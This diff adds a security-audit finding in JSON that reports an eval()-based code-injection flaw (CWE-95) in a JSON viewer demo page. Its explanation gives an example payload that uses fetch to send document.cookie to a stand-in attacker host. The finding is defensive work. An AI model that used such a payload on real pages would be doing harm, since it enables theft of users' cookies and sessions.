@@ -1,0 +1,33 @@
+{
+  "findings": [
+    {
+      "file": "demo.html",
+      "function": "renderJson",
+      "line_start": 34,
+      "line_end": 34,
+      "cwe": "CWE-95",
+      "title": "Arbitrary JavaScript execution via eval() of user-supplied JSON input",
+      "explanation": "The demo page parses the contents of the #json-input textarea by passing it to eval() instead of JSON.parse(): var input = eval('(' + $('#json-input').val() + ')'). The textarea holds a JSON document that is untrusted by design - the entire purpose of the page is to paste in a JSON blob (an API response, a file someone sent you) and view it. Because eval() interprets the text as JavaScript rather than as data, any non-JSON expression in that text is executed with the full privileges of the page's origin. Pasting {\"a\": fetch('https://attacker.example/?c='+document.cookie)} or (function(){/* arbitrary code */})() runs the attacker's code, giving access to cookies, localStorage and the DOM of the hosting origin (the project publishes this file as its GitHub Pages demo). No user confirmation is needed beyond the paste: renderJson() is wired to the 'Transform to HTML' button (line 49), to every option checkbox (line 52), and is also called unconditionally on page load (line 55), so the payload fires on the first interaction. The surrounding try/catch only swallows the error after evaluation has already taken place, so it provides no protection.",
+      "path": [
+        {
+          "file": "demo.html",
+          "function": "(html element textarea#json-input)",
+          "line": 61,
+          "role": "source"
+        },
+        {
+          "file": "demo.html",
+          "function": "renderJson",
+          "line": 34,
+          "role": "propagator"
+        },
+        {
+          "file": "demo.html",
+          "function": "renderJson",
+          "line": 34,
+          "role": "sink"
+        }
+      ]
+    }
+  ]
+}
